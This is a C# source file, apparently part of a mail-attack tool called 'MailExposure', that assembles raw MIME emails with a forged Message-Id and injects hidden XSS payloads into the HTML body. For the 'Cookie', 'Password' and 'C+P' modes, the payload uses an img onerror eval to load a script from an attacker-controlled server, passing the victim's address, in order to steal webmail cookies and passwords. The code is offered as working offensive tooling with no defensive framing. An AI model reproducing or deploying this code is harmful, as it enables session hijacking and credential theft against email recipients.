using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using MailExposure.RecordInfo;

namespace MailExposure.MailXssCode
{
    class Ru
    {
        // Fields
        private string CRLF;

        // Methods
        public Ru()
        {
            CRLF = "\r\n";
        }
        public string MailPackage(Model model)
        {
            this.Xss(model);
            if (model.AttachmentName == null)
            {
                return ("MIME-Version: 1.0" + this.CRLF + "From:" + model.Nickname + "<" + model.Addresser + ">" + this.CRLF + "To:" + model.Addressee + this.CRLF + "Message-Id: <4C204D28.1CBB7D.06708@m12-17.163.com>" + this.CRLF + "Subject:" + model.Subject + this.CRLF + "Content-type:text/html;" + this.CRLF + "Content-Transfer-Encoding:quoted-printable" + this.CRLF + this.CRLF + model.Content + model.XSSCode + this.CRLF + this.CRLF + "." + this.CRLF);
            }
            string code = new StreamReader(model.AttachmentSrc, Encoding.GetEncoding("gb2312")).ReadToEnd();
            return string.Concat(new object[]
            { 
                "MIME-Version: 1.0", this.CRLF, "Content-Type: multipart/mixed; boundary=Mail_Boundary_00201010", this.CRLF, "From:", model.Nickname, "<", model.Addresser, ">", this.CRLF, "To:", model.Addressee, this.CRLF, "Subject:", model.Subject, this.CRLF, 
                this.CRLF, "Content-Type: multipart/alternative; boundary=Mail_Boundary_00201010", this.CRLF, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=\"gbk\"", this.CRLF, "Content-Transfer-Encoding: 7bit", this.CRLF, this.CRLF, this.CRLF, model.XSSCode, model.Content, this.CRLF, this.CRLF, 
                "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=\"gbk\"file=", model.AttachmentName, this.CRLF, "Content-Transfer-Encoding: base64", this.CRLF, "Content-Disposition: attachment;filename=", model.AttachmentName, this.CRLF, this.CRLF, '<', model.EncodeBase64(code), '>', this.CRLF, "--Mail_Boundary_00201010--", 
                this.CRLF, this.CRLF, '.', this.CRLF
            });

        }

        private void Xss(Model model)
        {
            Record record = new Record();
            if (model.Type == "Cookie")
            {
                model.Address = "http://" + record.Dns("") + "/ru/ruC.asp?";
                model.XSSCode = "<HTML><HEAD>" + this.CRLF + "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=\"utf-8\">" + this.CRLF + "<META name=GENERATOR content=\"MSHTML 8.00.6001.18904\"></HEAD>" + this.CRLF + "<BODY>" + this.CRLF + "<div style=\"display:none\" id=\"lovely3\">function go(){var f=document.createElement('script');f.src='" + model.Address + "uid=" + model.Addressee + "!a=a'.replace(/!/g,String.fromCharCode(38));document.body.appendChild(f)}document.body.onload=go</div><style>a{font:'a\\'};</style><a style=\"display:none\">'</a><img width=0 src=# onerror=\"eval(lovely3.innerHTML)\"></style><P></P>" + this.CRLF + "</BODY></HTML>";
            }
            else if (model.Type == "Password")
            {
                model.Address = "http://" + record.Dns("") + "/ru/ruP.asp?";
                model.XSSCode = "<HTML><HEAD>" + this.CRLF + "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=\"utf-8\">" + this.CRLF + "<META name=GENERATOR content=\"MSHTML 8.00.6001.18904\"></HEAD>" + this.CRLF + "<BODY>" + this.CRLF + "<div style=\"display:none\" id=\"lovely3\">function go(){var f=document.createElement('script');f.src='" + model.Address + "uid=" + model.Addressee + "';document.body.appendChild(f)}document.body.onload=go</div><style>a{font:'a\\'};</style><a style=\"display:none\">'</a><img width=0 src=# onerror=\"eval(lovely3.innerHTML)\"></style><P></P>" + this.CRLF + "</BODY></HTML>";
            }
            else if (model.Type == "Mail")
            {
                model.XSSCode = "";
            }
            else if (model.Type == "C+P")
            {
                model.Address = "http://" + record.Dns("") + "/ru/ruCP.asp?";
                model.XSSCode = "<HTML><HEAD>" + this.CRLF + "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=\"utf-8\">" + this.CRLF + "<META name=GENERATOR content=\"MSHTML 8.00.6001.18904\"></HEAD>" + this.CRLF + "<BODY>" + this.CRLF + "<div style=\"display:none\" id=\"lovely3\">function go(){var f=document.createElement('script');f.src='" + model.Address + "uid=" + model.Addressee + "!a=a'.replace(/!/g,String.fromCharCode(38));document.body.appendChild(f)}document.body.onload=go</div><style>a{font:'a\\'};</style><a style=\"display:none\">'</a><img width=0 src=# onerror=\"eval(lovely3.innerHTML)\"></style><P></P>" + this.CRLF + "</BODY></HTML>";
            }
        }
    }
}
